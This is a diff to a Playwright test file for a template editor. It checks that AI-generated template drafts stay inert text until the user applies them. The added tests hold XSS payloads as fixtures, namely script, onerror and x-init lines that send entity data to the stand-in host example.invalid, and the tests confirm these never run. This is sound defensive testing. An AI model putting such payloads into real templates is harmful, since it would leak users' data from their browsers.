@@ -1,14 +1,14 @@
 /**
  * Natural-language generation of category template sections. The generate
  * button on each Custom* / MetaSchema editor (and the whole-template panel)
- * POSTs to /v1/{carrier}/generateTemplate and writes the result into the
- * CodeMirror-backed hidden input. The provider is stubbed via page.route so no
- * DeepSeek key is needed.
+ * POSTs to /v1/{carrier}/generateTemplate and holds the result as a draft,
+ * shown as text, until Apply writes it into the CodeMirror-backed hidden input.
+ * The provider is stubbed via page.route so no DeepSeek key is needed.
  */
 import { test, expect } from '../fixtures/base.fixture';
 
 test.describe('Template section generation', () => {
-  test('a valid slot draft is applied to the editor', async ({ page }) => {
+  test('a valid slot draft is held for review and applied on Apply', async ({ page }) => {
     let seenBody: Record<string, unknown> | null = null;
     await page.route('**/v1/category/generateTemplate', async (route) => {
       seenBody = route.request().postDataJSON();
@@ -32,11 +32,15 @@ test.describe('Template section generation', () => {
     await page.getByTestId('generate-prompt-CustomHeader').fill('a header with the name');
     await genButton.click();
 
+    await expect(page.getByTestId('generate-review-CustomHeader')).toContainText('<h1>[property path="Name"]</h1>', { timeout: 10000 });
+    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
+    await page.getByTestId('generate-apply-CustomHeader').click();
     await expect(page.locator('input[name="CustomHeader"]')).toHaveValue(
       '<h1>[property path="Name"]</h1>',
       { timeout: 10000 },
     );
     await expect(page.getByTestId('generate-status-CustomHeader')).toContainText('applied');
+    await expect(page.getByTestId('generate-review-CustomHeader')).toHaveCount(0);
     await expect(page.locator('[data-template-cluster="CustomHeader"] input[name="CustomHeaderCSS"]')).toHaveValue('h1{color:red}');
 
     // The request must carry the target + slot so the server routes correctly.
@@ -77,13 +81,14 @@ test.describe('Template section generation', () => {
     await expect(page.getByTestId('generate-error-CustomHeader')).toHaveCount(0);
 
     releaseEditors();
+    await page.getByTestId('generate-apply-CustomHeader').click();
     await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>[property path="Name"]</h1>');
     await expect(page.locator('[data-template-cluster="CustomHeader"] input[name="CustomHeaderCSS"]')).toHaveValue('h1{color:red}');
     await expect(page.getByTestId('generate-status-CustomHeader')).toContainText('applied');
     await page.unrouteAll({ behavior: 'ignoreErrors' });
   });
 
-  test('an invalid slot draft stays out of the editor until "Use anyway"', async ({ page }) => {
+  test('an invalid slot draft stays out of the editor until Apply', async ({ page }) => {
     await page.route('**/v1/category/generateTemplate', async (route) => {
       await route.fulfill({
         status: 200,
@@ -301,7 +306,192 @@ for (const carrier of ['category', 'resourceCategory', 'noteType']) {
     const pair = page.locator('[data-template-cluster="CustomMRQLResult"]');
     await pair.getByTestId('generate-prompt-CustomMRQLResult').fill('Style the result card');
     await pair.getByTestId('generate-button-CustomMRQLResult').click();
+    await pair.getByTestId('generate-apply-CustomMRQLResult').click();
     await expect(pair.locator('input[name="CustomMRQLResult"]')).toHaveValue('<p class="result">Card</p>');
     await expect(pair.locator('input[name="CustomMRQLResultCSS"]')).toHaveValue('.result{color:red}');
   });
 }
+
+// Decision 10: a generated draft never runs before Apply. The preview runs
+// scripts against the full entity, so a draft that reached it unreviewed could
+// send that entity out from the author's browser.
+test.describe('Generated drafts do not run before Apply', () => {
+  const pairDrafts: Record<string, string> = {
+    script: '<p class="x">[property path="Name"]</p><script>fetch("https://example.invalid/?s=1")</script>',
+    onerror: '<img src=x onerror="fetch(\'https://example.invalid/?e=1\')">',
+    'x-init': `<div x-init="location='https://example.invalid/?d='+JSON.stringify(entity)">hi</div>`,
+  };
+
+  for (const [name, header] of Object.entries(pairDrafts)) {
+    test(`a ${name} draft stays text: no editor, preview or network change before Apply`, async ({ page, apiClient }) => {
+      const category = await apiClient.createCategory(`Draft Guard ${name} ${Date.now()}`);
+      const groupName = `Draft Guard Target ${Date.now()}`;
+      await apiClient.createGroup({ name: groupName, categoryId: category.ID });
+      const leaked: string[] = [];
+      await page.context().route('**/example.invalid/**', async (route) => {
+        leaked.push(route.request().url());
+        await route.abort();
+      });
+      await page.route('**/v1/category/generateTemplate', async (route) => {
+        await route.fulfill({
+          status: 200,
+          contentType: 'application/json',
+          body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: header, CustomHeaderCSS: '.x{color:red}' } }),
+        });
+      });
+      await page.goto(`/category/edit?id=${category.ID}`);
+      await expect(page.locator('#tp-entity-group')).toHaveValue(groupName, { timeout: 10000 });
+      const frame = page.frameLocator('iframe[title="Template slot preview"]');
+      const iframe = page.locator('iframe[title="Template slot preview"]');
+      // Let the first render land, so the comparison below is against it.
+      await expect.poll(async () => (await iframe.getAttribute('srcdoc')) ?? '', { timeout: 10000 }).toContain('<html');
+      await page.waitForTimeout(500);
+      const srcdocBefore = await iframe.getAttribute('srcdoc');
+
+      await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
+      await page.getByTestId('generate-button-CustomHeader').click();
+      const review = page.getByTestId('generate-review-CustomHeader');
+      // The markup is literal text in the panel, and its code is called out.
+      await expect(review.getByTestId('generate-review-field-CustomHeader')).toContainText(header);
+      await expect(review).toContainText('Runs code once applied');
+      await expect(review.locator('script, img[onerror], [x-init]')).toHaveCount(0);
+
+      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
+      await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('');
+      // Refresh re-renders from the hidden inputs, so it catches a draft that
+      // leaked into them.
+      await page.getByRole('button', { name: 'Refresh' }).click();
+      await page.waitForTimeout(500);
+      const srcdocAfter = (await iframe.getAttribute('srcdoc')) ?? '';
+      expect(srcdocAfter).not.toContain('example.invalid');
+      expect(srcdocAfter).toBe(srcdocBefore ?? '');
+      await expect(frame.locator('body')).not.toContainText('hi');
+      expect(leaked).toEqual([]);
+    });
+  }
+
+  test('a CSS draft that closes its style tag stays text before Apply', async ({ page }) => {
+    const leaked: string[] = [];
+    await page.context().route('**/example.invalid/**', async (route) => {
+      leaked.push(route.request().url());
+      await route.abort();
+    });
+    const css = `.a{color:red}</style><div x-init="location='https://example.invalid/?c=1'">x</div>`;
+    await page.route('**/v1/category/generateTemplate', async (route) => {
+      await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ target: 'slot', valid: true, explanation: 'x', content: css }) });
+    });
+    await page.goto('/category/new');
+    await page.getByTestId('generate-prompt-CustomCSS').fill('styles');
+    await page.getByTestId('generate-button-CustomCSS').click();
+    const review = page.getByTestId('generate-review-CustomCSS');
+    await expect(review).toContainText(css);
+    await expect(review).toContainText('</style> breakout');
+    await expect(review.locator('[x-init]')).toHaveCount(0);
+    await expect(page.locator('input[name="CustomCSS"]')).toHaveValue('');
+    await page.waitForTimeout(300);
+    expect(leaked).toEqual([]);
+  });
+
+  for (const [kind, extra] of Object.entries({
+    valid: { valid: true },
+    invalid: { valid: false, issues: [{ severity: 'error', message: '[meta] is missing required attribute "path"' }] },
+    'auto-repaired': { valid: true, repair: { attempted: true, applied: true, reason: '' } },
+  })) {
+    test(`Apply is offered and works for a ${kind} draft`, async ({ page }) => {
+      await page.route('**/v1/category/generateTemplate', async (route) => {
+        await route.fulfill({
+          status: 200,
+          contentType: 'application/json',
+          body: JSON.stringify({ target: 'bundle', explanation: 'x', slots: { CustomHeader: `<h1>${kind}</h1>`, CustomHeaderCSS: '' }, ...extra }),
+        });
+      });
+      await page.goto('/category/new');
+      await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
+      await page.getByTestId('generate-button-CustomHeader').click();
+      await expect(page.getByTestId('generate-apply-CustomHeader')).toBeVisible();
+      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
+      await page.getByTestId('generate-apply-CustomHeader').click();
+      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue(`<h1>${kind}</h1>`);
+    });
+  }
+
+  test('a truncated incomplete pair shows the truncation issue, not the pair-shape error', async ({ page }) => {
+    await page.route('**/v1/category/generateTemplate', async (route) => {
+      await route.fulfill({
+        status: 200,
+        contentType: 'application/json',
+        body: JSON.stringify({ target: 'bundle', valid: false, explanation: '', slots: { CustomHeader: '<h1>half' }, issues: [truncationIssue] }),
+      });
+    });
+    await page.goto('/category/new');
+    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
+    await page.getByTestId('generate-button-CustomHeader').click();
+    await expect(page.getByTestId('generate-error-CustomHeader')).toContainText('cut off at its output limit');
+    await expect(page.getByTestId('generate-error-CustomHeader')).not.toContainText('must return both');
+    await expect(page.getByTestId('generate-apply-CustomHeader')).toHaveCount(0);
+    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
+  });
+
+  test('Apply after an edit during generation asks first and keeps the edit on cancel', async ({ page }) => {
+    let release!: () => void;
+    const released = new Promise<void>((resolve) => { release = resolve; });
+    await page.route('**/v1/category/generateTemplate', async (route) => {
+      await released;
+      await route.fulfill({
+        status: 200,
+        contentType: 'application/json',
+        body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>Draft</h1>', CustomHeaderCSS: '.draft{}' } }),
+      });
+    });
+    await page.goto('/category/new');
+    const cssEditor = page.locator('.cm-content[aria-label="Custom Header CSS"]');
+    await expect(cssEditor).toBeVisible({ timeout: 10000 });
+    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
+    await page.getByTestId('generate-button-CustomHeader').click();
+    await cssEditor.click();
+    await page.keyboard.type('.mine{}');
+    release();
+
+    await page.getByTestId('generate-apply-CustomHeader').click();
+    const dialog = page.getByRole('alertdialog', { name: 'Replace your edits?' });
+    await expect(dialog).toContainText('CustomHeaderCSS');
+    await dialog.getByRole('button', { name: 'Keep my edits' }).click();
+    await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('.mine{}');
+    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
+
+    await page.getByTestId('generate-apply-CustomHeader').click();
+    await page.getByRole('alertdialog', { name: 'Replace your edits?' }).getByRole('button', { name: 'Replace' }).click();
+    await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('.draft{}');
+    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>Draft</h1>');
+  });
+
+  test('a bundle Apply after an edit during generation asks first and keeps the edit on cancel', async ({ page }) => {
+    let release!: () => void;
+    const released = new Promise<void>((resolve) => { release = resolve; });
+    await page.route('**/v1/category/generateTemplate', async (route) => {
+      await released;
+      await route.fulfill({
+        status: 200,
+        contentType: 'application/json',
+        body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>Draft</h1>', CustomHeaderCSS: '', CustomCSS: '.draft{}' } }),
+      });
+    });
+    await page.goto('/category/new');
+    const header = page.locator('.cm-content[aria-label="Custom Header"]');
+    await expect(header).toBeVisible({ timeout: 10000 });
+    await page.getByTestId('template-bundle-generate-prompt').fill('a template');
+    await page.getByTestId('template-bundle-generate-button').click();
+    await header.click();
+    await page.keyboard.type('<p>mine</p>');
+    release();
+
+    await page.getByTestId('template-bundle-apply').click();
+    const dialog = page.getByRole('alertdialog', { name: 'Replace your edits?' });
+    await expect(dialog).toContainText('CustomHeader');
+    await expect(dialog).not.toContainText('CustomCSS');
+    await dialog.getByRole('button', { name: 'Keep my edits' }).click();
+    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<p>mine</p>');
+    await expect(page.locator('input[name="CustomCSS"]')).toHaveValue('');
+    await expect(page.getByTestId('template-bundle-review')).toBeVisible();
+  });
+});
